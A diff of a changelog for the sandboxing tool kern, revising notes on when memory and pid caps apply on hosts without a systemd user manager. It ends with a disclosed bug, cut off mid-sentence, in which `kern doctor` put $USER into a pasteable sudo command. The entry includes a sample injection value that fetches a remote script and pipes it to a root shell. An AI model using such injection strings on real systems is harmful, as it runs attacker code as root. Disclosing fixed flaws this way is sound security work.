@@ -45,10 +45,14 @@ Nothing yet.
 ### Fixed
 
 - ⚠️ **A box that used to run uncapped on some hosts is now capped, and can be OOM-killed where it
-  previously survived.** `--memory` and the pid cap now bind on a host with no `systemd --user`
-  manager: a container, WSL2, a colima VM on a Mac. Boxes there had no ceiling at all, including the
-  defaults that apply with no flags. `kern doctor` shows which kind of host you are on;
-  `--allow-uncapped` keeps the old behaviour. Hosts that were already capping are unaffected.
+  previously survived.** `--memory` and the pid cap now bind when kern runs **as root** on a host
+  with no `systemd --user` manager: a container, or WSL2, where kern is uid 0. Boxes there had no
+  ceiling at all, including the defaults that apply with no flags. `kern doctor` shows which kind of
+  host you are on; `--allow-uncapped` keeps the old behaviour. Hosts that were already capping are
+  unaffected, and so is a ROOTLESS session with no user manager: there kern still has no cgroup it
+  may write to, and still says so at every start. A colima guest reached over `colima ssh` is that
+  second case, measured on Apple Silicon: the session lands in `/system.slice/ssh.service`, owned by
+  root and not writable by the user, and no `user@<uid>.service` is ever created.
 
 - **`kern doctor` interpolated `$USER` into a `sudo` command it invites you to paste.** With
   `USER='x; curl http://host/p | sh #'` it printed a line that runs an attacker's script as root. It
